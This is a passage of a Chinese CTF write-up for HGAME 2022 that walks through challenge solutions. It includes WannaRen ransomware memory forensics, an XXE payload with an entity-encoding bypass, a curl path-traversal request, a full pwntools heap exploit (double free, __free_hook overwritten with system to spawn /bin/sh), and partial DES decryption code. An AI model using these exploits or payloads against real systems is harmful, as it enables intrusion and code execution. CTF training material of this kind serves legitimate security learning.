c <span style="color:#f92672">=</span> <span style="color:#ae81ff">165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224</span>
d <span style="color:#f92672">=</span> <span style="color:#ae81ff">13094612077654083919</span>
print(n2s(pow(c, d, n)))
<span style="color:#75715e"># hgame{dO|YOU:kNOw!tHE*PRINcIplE*bEhInd%WInNEr#aTTacK}</span>
</code></pre></div><h3 id="misc卡中毒">[Misc]卡中毒</h3>
<blockquote>
<p>By NULLPointer</p>
</blockquote>
<p>题目给出了一个 raw 文件，提示本题考查内存审计的知识点。使用内存审计工具 volativity 查看文件信息。</p>
<p>首先查看系统配置，使用指令 imageinfo 指令查看系统文件，发现主系统为 Win7SP1x64。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 390; 
			flex-basis: 937px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/CardVirus_imageinfo.png" data-size="1051x269">
		<img src="/post/hgame2022-writeup-by-or4nge/img/CardVirus_imageinfo.png"
			width="1051"
			height="269"
			srcset="/post/hgame2022-writeup-by-or4nge/img/CardVirus_imageinfo_hu1e4d8e99f2b07f04176a82bbae3aebec_41399_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/CardVirus_imageinfo_hu1e4d8e99f2b07f04176a82bbae3aebec_41399_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>随后使用 pslist 和 filescan 指令查看运行程序和系统文件，为加快扫描速度只提取 flag 等关键词，发现名为 flag.txt.txt.7z 和 flag.txt.txt.WannaRen 的文件。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 800; 
			flex-basis: 1920px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/CardVirus_wannaren.png" data-size="1112x139">
		<img src="/post/hgame2022-writeup-by-or4nge/img/CardVirus_wannaren.png"
			width="1112"
			height="139"
			srcset="/post/hgame2022-writeup-by-or4nge/img/CardVirus_wannaren_hu248b25003f41073691ee836af893ee5b_46043_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/CardVirus_wannaren_hu248b25003f41073691ee836af893ee5b_46043_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>使用 dumpfiles 指令提取文件，用 HexEditor 扫描无异常，打开 flag.txt.txt.WannaRen 文件发现内容被加密，无法阅读。查阅相关资料得知系统感染了 WannaRen 病毒导致系统内部存储文件被加密。WannaRen 使用 RC4 和 RSA 的混合加密模式，加密后的文件名会被修改为 WannaRen，只能使用对应的 RSA 私钥解密，无法被暴力破解。目前已有针对该病毒的解密工具，下载解密工具并按照操作流程解密得到 flag.txt.txt 文件。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 189; 
			flex-basis: 455px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/CardVirus_wannarendec.png" data-size="954x503">
		<img src="/post/hgame2022-writeup-by-or4nge/img/CardVirus_wannarendec.png"
			width="954"
			height="503"
			srcset="/post/hgame2022-writeup-by-or4nge/img/CardVirus_wannarendec_hue2bad3d01574e30ab4e7c888f730a039_38357_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/CardVirus_wannarendec_hue2bad3d01574e30ab4e7c888f730a039_38357_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 562; 
			flex-basis: 1349px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/CardVirus_flag.png" data-size="1231x219">
		<img src="/post/hgame2022-writeup-by-or4nge/img/CardVirus_flag.png"
			width="1231"
			height="219"
			srcset="/post/hgame2022-writeup-by-or4nge/img/CardVirus_flag_hu29c17174b2717c25cfe9ea45d77cf067_19643_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/CardVirus_flag_hu29c17174b2717c25cfe9ea45d77cf067_19643_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>文件内容使用新与佛论禅加密，使用解密网站 <a class="link" href="http://hi.pcmoe.net/buddha.html"  target="_blank" rel="noopener"
    >http://hi.pcmoe.net/buddha.html</a> 解密即可得到flag。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 219; 
			flex-basis: 526px"
	>
	<a href="/post/hgame2022-writeup-by-or4nge/img/CardVirus_yflc.png" data-size="1108x505">
		<img src="/post/hgame2022-writeup-by-or4nge/img/CardVirus_yflc.png"
			width="1108"
			height="505"
			srcset="/post/hgame2022-writeup-by-or4nge/img/CardVirus_yflc_hue3cbca2b1538ec9060e9b9706870ef67_56825_480x0_resize_box_3.png 480w, /post/hgame2022-writeup-by-or4nge/img/CardVirus_yflc_hue3cbca2b1538ec9060e9b9706870ef67_56825_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h2 id="week4">week4</h2>
<h3 id="webcomment">[Web]Comment</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<p>代码中允许引入外部实体，<code>libxml_disable_entity_loader(false);</code></p>
<p>协议过滤的比较死，但是能通过 <code>compress.zlib://</code> 这个协议拿到 <code>/etc/passwd</code> 这种，但是还是拿不到源码，因为源码里有 php。</p>
<p>于是利用 data 协议的输入流，将输入流 base64，将外部实体导入到 <code>&lt;sender&gt;</code> 当中，绕过 waf。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
<span style="color:#75715e">&lt;!DOCTYPE foo [
</span><span style="color:#75715e">&lt;!ELEMENT foo ANY &gt;</span>
<span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;data://text/plain;base64,YWRtaW4=&#34; &gt;</span>]&gt;
<span style="color:#f92672">&lt;comment&gt;&lt;sender&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/sender&gt;&lt;content&gt;&lt;/content&gt;</span>sb<span style="color:#f92672">&lt;/comment&gt;</span>
</code></pre></div><p>pil1ow 师傅的做法非预期了，用 html 实体编码绕，不用引入外部实体。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;comment&gt;&lt;sender&gt;</span>&amp;#97;&amp;#100;&amp;#109;&amp;#105;&amp;#110;<span style="color:#f92672">&lt;/sender&gt;&lt;content&gt;</span>sb<span style="color:#f92672">&lt;/content&gt;&lt;/comment&gt;</span>
</code></pre></div><p>好文章：</p>
<blockquote>
<p><a class="link" href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#waf-and-protections-bypasses"  target="_blank" rel="noopener"
    >XXE - XEE - XML External Entity - HackTricks</a></p>
</blockquote>
<h3 id="webfilesystem">[Web]FileSystem</h3>
<blockquote>
<p>By SSGSS</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl --path-as-is -X CONNECT http://1e4c3338e4.filesystem.hgame.homeboyc.cn/main.go/../there_may_be_a_flag
hgame<span style="color:#f92672">{</span>79f33a8b9913e797c56375c6a78865dc439578f70d572b9a402f1ad57f7eb856<span style="color:#f92672">}</span>
</code></pre></div><h3 id="pwnvector">[Pwn]vector</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<ul>
<li>了解 vector 的申请原理，制造 double_free</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vector&#34;</span>)
<span style="color:#75715e"># p = remote(&#34;chuj.top&#34;, 51445)</span>
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)

<span style="color:#75715e"># def proof(y):</span>
<span style="color:#75715e">#     may = string.ascii_letters+string.digits</span>
<span style="color:#75715e">#     for i in may:</span>
<span style="color:#75715e">#         for j in may:</span>
<span style="color:#75715e">#             for k in may:</span>
<span style="color:#75715e">#                 for l in may:</span>
<span style="color:#75715e">#                     res = i +j +k +l</span>
<span style="color:#75715e">#                     if hashlib.sha256((res).encode()).hexdigest() == y:</span>
<span style="color:#75715e">#                         p.sendline(res)</span>
<span style="color:#75715e">#                         return</span>
<span style="color:#75715e">#     print(&#39;Wrong!&#39;)</span>


<span style="color:#75715e"># p.recvuntil(b&#34; == &#34;)</span>
<span style="color:#75715e"># a = p.recvuntil(b&#34;\n&#34;)[:-1].decode()</span>
<span style="color:#75715e"># print(a)</span>
<span style="color:#75715e"># proof(a)</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>(i):
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;farewell&#34;</span>, str(i))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx, size, content):
    menu(<span style="color:#ae81ff">1</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;size?&#34;</span>, str(size))
    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;content?&#34;</span>, content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
    menu(<span style="color:#ae81ff">3</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
    menu(<span style="color:#ae81ff">4</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">move</span>(f, t):
    menu(<span style="color:#ae81ff">5</span>)
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(f):
        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;[1/0]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;[1/0]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, str(t))



<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
    add(i, <span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaa&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">10</span>):
    add(i, <span style="color:#ae81ff">0x70</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaa&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">8</span>):
    free(i)

free(<span style="color:#ae81ff">0</span>)
add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaaaaaa&#39;</span>)
show(<span style="color:#ae81ff">0</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__malloc_hook&#34;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x170</span>
print(hex(libc<span style="color:#f92672">.</span>address))

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>):
    add(i, <span style="color:#ae81ff">0x70</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaa&#39;</span>)

move(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">17</span>)
add(<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx:10&#39;</span>)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">10</span>):
    free(i)

free(<span style="color:#ae81ff">2</span>)
free(<span style="color:#ae81ff">10</span>)
free(<span style="color:#ae81ff">17</span>)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>):
    add(i, <span style="color:#ae81ff">0x70</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
add(<span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x70</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]))
add(<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pass</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
add(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00\n</span><span style="color:#e6db74">&#39;</span>)
add(<span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">0x70</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]))
free(<span style="color:#ae81ff">12</span>)

gdb<span style="color:#f92672">.</span>attach(p)
p<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="rewow">[RE]WOW</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>这题几乎和天堂之门没关系，主要是把密钥隐藏了，运算之后应该是 <code>12345678</code>，但也可以直接用 windbg 动调拿到轮密钥</p>
<p>通过置换函数+明显的常数特征判断是 DES，直接解密就行</p>
<p>网上抄了份 DES，改一改就行</p>
<p>solve.c</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;bool.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;tables.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitsCopy</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Len);

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ByteToBit</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitToByte</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num);

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitToHex</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">HexToBit</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num);

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">TablePermute</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>Table,<span style="color:#66d9ef">int</span> Num);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">LoopMove</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Len,<span style="color:#66d9ef">int</span> Num);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Xor</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatA,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatB,<span style="color:#66d9ef">int</span> Num);

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">S_Change</span>(<span style="color:#66d9ef">bool</span> DatOut[<span style="color:#ae81ff">32</span>],<span style="color:#66d9ef">bool</span> DatIn[<span style="color:#ae81ff">48</span>]);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">F_Change</span>(<span style="color:#66d9ef">bool</span> DatIn[<span style="color:#ae81ff">32</span>],<span style="color:#66d9ef">bool</span> DatKi[<span style="color:#ae81ff">48</span>]);

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SetKey</span>(<span style="color:#66d9ef">char</span> KeyIn[<span style="color:#ae81ff">8</span>]);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">PlayDes</span>(<span style="color:#66d9ef">char</span> MesOut[<span style="color:#ae81ff">8</span>],<span style="color:#66d9ef">char</span> MesIn[<span style="color:#ae81ff">8</span>]);
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">KickDes</span>(<span style="color:#66d9ef">char</span> MesOut[<span style="color:#ae81ff">8</span>],<span style="color:#66d9ef">char</span> MesIn[<span style="color:#ae81ff">8</span>]);


<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#66d9ef">char</span> MesHex[<span style="color:#ae81ff">64</span>]<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;92028926CF6497655A09A46F3A079DB14320B10556683353BB5AF969BBB23EA2&#34;</span>};         <span style="color:#75715e">// 16个字符数组用于存放 64位16进制的密文
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> MyMessage[<span style="color:#ae81ff">32</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0</span>};
    
    KickDes(MyMessage,MesHex);
    KickDes(MyMessage<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>,MesHex<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);
    KickDes(MyMessage<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>,MesHex<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>);
    KickDes(MyMessage<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>,MesHex<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>);
    
    printf(<span style="color:#e6db74">&#34;Deciphering Over !!:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
        printf(<span style="color:#e6db74">&#34;%c&#34;</span>, MyMessage[i]);
    }
    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    system(<span style="color:#e6db74">&#34;pause&#34;</span>);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitsCopy</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Len) {
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Len; i<span style="color:#f92672">++</span>) {
        DatOut[i] <span style="color:#f92672">=</span> DatIn[i];
    }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ByteToBit</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num) {
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
        DatOut[i] <span style="color:#f92672">=</span> (DatIn[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">&gt;&gt;</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x01</span>;   
    }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitToByte</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num) {
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> (Num <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>); i<span style="color:#f92672">++</span>) {
        DatOut[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    }
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
        DatOut[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">|=</span> DatIn[i] <span style="color:#f92672">&lt;&lt;</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>);    
    }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">BitToHex</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num) {
    <span style="color:#66d9ef">int</span> i;
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>) {
        DatOut[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    }
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>) {
        DatOut[i] <span style="color:#f92672">=</span> DatIn[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> (DatIn[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>)
                    <span style="color:#f92672">+</span> (DatIn[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> (DatIn[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>);
        <span style="color:#66d9ef">if</span>((DatOut[i] <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">9</span>) {
            DatOut[i] <span style="color:#f92672">=</span> DatOut[i] <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;7&#39;</span>;
        }
        <span style="color:#66d9ef">else</span> {
            DatOut[i] <span style="color:#f92672">=</span> DatOut[i] <span style="color:#f92672">%</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0&#39;</span>;
        }
    }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">HexToBit</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">int</span> Num) {
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
        <span style="color:#66d9ef">if</span>((DatIn[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#39;9&#39;</span>) {
            DatOut[i] <span style="color:#f92672">=</span> ((DatIn[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;7&#39;</span>) <span style="color:#f92672">&gt;&gt;</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x01</span>;               
        }
        <span style="color:#66d9ef">else</span> {
            DatOut[i] <span style="color:#f92672">=</span> ((DatIn[i <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">&gt;&gt;</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x01</span>;
        }
    }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">TablePermute</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatOut,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatIn,<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>Table,<span style="color:#66d9ef">int</span> Num) {
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> Temp[<span style="color:#ae81ff">256</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
        Temp[i] <span style="color:#f92672">=</span> DatIn[Table[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>];
    }
    BitsCopy(DatOut, Temp, Num);
} 

